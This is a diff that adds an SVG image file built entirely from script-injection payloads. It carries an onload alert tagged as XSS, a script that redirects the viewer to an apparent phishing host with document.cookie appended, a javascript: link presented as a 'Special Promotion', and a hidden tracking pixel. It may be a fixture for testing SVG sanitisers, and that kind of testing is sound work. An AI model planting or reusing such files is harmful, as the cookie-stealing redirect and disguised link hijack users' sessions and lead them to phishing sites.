@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300" viewBox="0 0 400 300">
+    <rect width="100%" height="100%" fill="#f1f5f9"/>
+    <circle cx="200" cy="150" r="80" fill="#ef4444" onload="alert('XSS: SVG DOM onload executed!');"/>
+    
+    <!-- Script Execution -->
+    <script type="text/javascript">
+        console.warn("Active script payload in SVG vector container.");
+        window.location.href = "https://phishing-portal.malicious-site.xyz/exfiltrate?cookie=" + document.cookie;
+    </script>
+    
+    <!-- JavaScript Pseudo-Protocol Link -->
+    <a xlink:href="javascript:alert('JavaScript URL Triggered');">
+        <text x="200" y="270" text-anchor="middle" font-size="14" fill="#0f172a">Click for Special Promotion</text>
+    </a>
+    
+    <!-- External Reference -->
+    <image xlink:href="http://tracker.remote-beacon.xyz/pixel.png" width="1" height="1"/>
+</svg>
